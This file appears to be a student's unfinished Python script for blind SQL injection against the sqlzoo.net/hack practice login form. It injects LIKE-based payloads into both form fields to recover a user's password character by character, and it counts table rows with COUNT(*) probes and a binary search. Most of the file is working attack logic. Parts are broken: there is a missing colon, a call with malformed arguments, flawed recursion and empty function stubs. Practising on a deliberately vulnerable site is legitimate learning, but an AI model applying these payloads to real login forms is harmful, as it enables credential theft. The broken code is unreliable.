import requests
import math

def checkPasswordCharacter(character, username, url, index = "no index"):
   """checks for character(s) at specified location in the password 

   Args:
      index: integer representing the location in the password string to check for character
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      username: username associated with password being checked for character

      url: url of the username & password form
      
      character: a single character or group of characters to check

   Returns: 
      bool: boolean
         true iff character is found at index in the password string
         if index = "no index" then it returns true iff character is in the password for user username

   Raises:
      tbd -- needs to be updated later!

      from the quick start guide:
         Errors and Exceptions
            
         In the event of a network problem (e.g. DNS failure, refused connection, etc), Requests will raise a ConnectionError exception.
         
         Response.raise_for_status() will raise an HTTPError if the HTTP request returned an unsuccessful status code.
         
         If a request times out, a Timeout exception is raised.
         
         If a request exceeds the configured number of maximum redirections, a TooManyRedirects exception is raised.
         
         All exceptions that Requests explicitly raises inherit from requests.exceptions.RequestException.
   """
   payload = constructPasswordPayload(character, username, index)
   query = sendQuery(payload, url)
   return readQuery(query)


def sendQuery(payload, url):
   """take an url and opens an http connection with payload as a parameter

   Args:
      payload: dictionary
         keys are names of elements in form -- name and password
         values are submission for that element of the form
      
      url: string
         base url to the form being submitted

   Returns:
      text result from the form submission

   Raises:
      tbd

   """

   r = requests.get(url, params = payload)
   return r.text

def readQuery(query):
   """ reads the html returned by the query and determines if login was successful

   Args:
      query: String
         html result of a form submission -- from sqlzoo.net/hack

      username: String
         username of login attempt

   Returns: boolean
      true iff login was successful

   Raises: tbd

   """
   # return username in query #fails! Jake is returned regardless of who's logging in unless whole password is entered correctly!
   return "Welcome" in query
   #should say "Welcome jake you are now logged in!
   # Log out" if succesful


def constructPasswordPayload(character, username, index = "no index"):
   """

   Args:
      index: integer 
         represents the location of character in the password string encoded
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      character: character(s) in password to check for username

      username: username associated with password

   Returns: 
      payload: dictionary
         form parameters as keys and data to submit as values
         keys are username and password

   """

   sqlQuery = constructSQLQuery(character, username, index)

   dickt = {"name" : sqlQuery, "password" : sqlQuery}

   return dickt;


def constructSQLQuery(character, username, index = "no index"):
   """makes SQL query for constructPasswordPayload.
      
      Another helper function, see documentation for constructPasswordPayload

   """

   # the LIKE command uses % and _ as wildcards. % for arbitrary characters(0 to n), _ for one. 
   # Looks like this is not MS access. Using * instead of % does not work, which makes sense.
   # https://www.w3schools.com/SQL/sql_like.asp
   # https://www.w3schools.com/sql/sql_wildcards.asp

   sqlQuery = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password LIKE '" 


   # No! make a password string in this if elif else block and concatonate that string at the end of sqlQuery

   passStr = ""

   if(index == "no index"):
      passStr += "%" + character + "%"

   elif(index == 0):
      passStr += character + "%"

    #len(padding) = index; all "_" characters
      
   elif(index >= 0):
      padding = "_" * index
      passStr = padding + character + "%"

   else:
      index   = -1 * index -1 # so index is non-negative; -1 since end is -1 and begining is 0 not 1. 
      padding = "_" * index
      passStr = "%" + character + padding

   sqlQuery += passStr + "') AND ''='"

   return sqlQuery;


def testPassword(password, username, url):
   """
   Tests a hypothetical password for a given username.

   Args:
      password: string
         hypothetical password
      username: string
         username
      url:
         url of the username and password form

   Returns: 
      boolean
         true iff username and password pair is valid and correct. 

   Raises:
      tbd

   """

   # payload = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password = '" + password + "') AND ''='"
   #this won't work!

   payload = {"name" : username, "password" : password}

   r = sendQuery(payload, url)

   # return readQuery(r, username);
   return username in r #since I changed readQuery



# implement this stuff next time
# https://sqlzoo.net/hack/20user.htm


def nUsers(n, table, url):
   """
   returns the number of users in the password table, ie with login details

   Args:
      n: integer
         will only check up to 2 raised to the nth power


   Returns:
      n: integer
         returns number of users in password table

   Raises:



   """
   if(n < 0): #base case
      return 0 #either negative n in arg or less than one entry found
   if(lessThanAEntries(2**n, table, url)): #recursive case
      return nUsers(2**(n-1), table, url) #recursive call shrinks towards -1/2 (2**-1)
   if(aEntries(2**n, table, url)) #base case
      return 2**n 
   else: #between n and 2n, so use binary search
      return binarySearch(2**n, 2**(n+1), table, url)
   
   # I think it gets stuck if n is too small? Take the ceiling instead of using // in binarySearch?
   

def binarySearch(a, b, table, url):
   """helper function.
   searches range (n,2n) ((exlusive!))

   a and b are end points of the search space

   Let m be the inital a value 
   Recall that m is 2 to the nth power for some integer n > 0.
   By definition, m is an even integer.
   It follows that m/2 = k for some integer k.
   """
   # n = (a + b)//2 # floor of the midpoint, ie integer division (// instead of / for float division)
   n = math.ceil((a + b)/2)
   if(lessThanAEntries((n, table, url))):
      return binarySearch(a, n, table, url)
   if(aEntries(n, table, url)):
      return n #found it
   if(n == b): # since n is not correct, and b is the larger end of this range, the n arg for nUsers is too small
# could move this up to optimize network usage, since inital a and b will be checked already b4 binary search is started!
      raise ValueError("Too many entries for given n. Need to use a bigger n!")
   else:
      return binarySearch(n, b, table, url)




def lessThanAEntries(a, table, url):
   """
   returns true if less than a entries are in the table

   Args:
      a: integer

      table: string
         name of table

      url: string
         url of form

   Returns
      mhm: boolean
         true if greater than a entries are found in table
   
   """

   payload = "' OR (SELECT COUNT(*) FROM " + table + ") < " + str(a) + " AND ''='"
   payload = {"name" : payload, "password" : payload}
   txt = sendQuery(payload, url)
   return readQuery(txt)


def aEntries(a, table, url):
   """
   returns true if a entries are in the table

   Args:
      a: integer

      table: string
         name of table

      url: string
         url of form

   Returns
      mhm: boolean
         true if exactly a entries are found in table
   
   """

   payload = "' OR (SELECT COUNT(*) FROM " + table + ") = " + str(a) + " AND ''='"
   payload = {"name" : payload, "password" : payload}
   txt = sendQuery(payload, url)
   return readQuery(txt)


def userNameLike()


def otherUserNameLike()






"""
links:

https://docs.python.org/3/tutorial/controlflow.html#more-on-defining-functions


"""


